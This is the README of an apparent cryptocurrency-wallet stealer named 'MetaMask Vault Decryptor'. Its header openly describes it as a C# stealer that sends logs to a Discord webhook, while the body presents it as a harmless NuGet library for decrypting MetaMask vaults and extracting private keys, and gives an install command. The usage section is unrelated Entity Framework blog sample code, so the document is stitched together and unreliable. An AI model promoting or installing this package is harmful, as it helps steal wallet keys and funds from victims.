<p align="center">
  <img width="40%" src="metamask234good.webp"> <br>
  <b>MetaMask Vault Decryptor</b> <br>
  <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
</p>

MetaMaskCrypto is a C# library that provides functionality for decrypting vaults encrypted by MetaMask. It allows you to securely access encrypted private keys and other sensitive information stored in your MetaMask vault.

## Features

- Decryption of MetaMask vaults
- Retrieval of encrypted private keys and other sensitive information

## Installation

MetaMaskCrypto can be easily installed via [NuGet](https://www.nuget.org/). Follow the steps below to install the library in your project:

1. Open the NuGet Package Manager Console in Visual Studio or the terminal in your project directory.
2. Run one of the following commands:

```bash
Install-Package MetaMaskCrypto
```

## Usage
To use MetaMaskCrypto in your project, follow the example code below:
```cs
using (var db = new BloggingContext())
{
    // Inserting data into the database
    db.Add(new Blog { Url = "http://blogs.msdn.com/adonet" });
    db.SaveChanges();

    // Querying
    var blog = db.Blogs
        .OrderBy(b => b.BlogId)
        .First();

    // Updating
    blog.Url = "https://devblogs.microsoft.com/dotnet";
    blog.Posts.Add(
        new Post
        {
            Title = "Hello World",
            Content = "I wrote an app using EF Core!"
        });
    db.SaveChanges();

    // Deleting
    db.Remove(blog);
    db.SaveChanges();
}
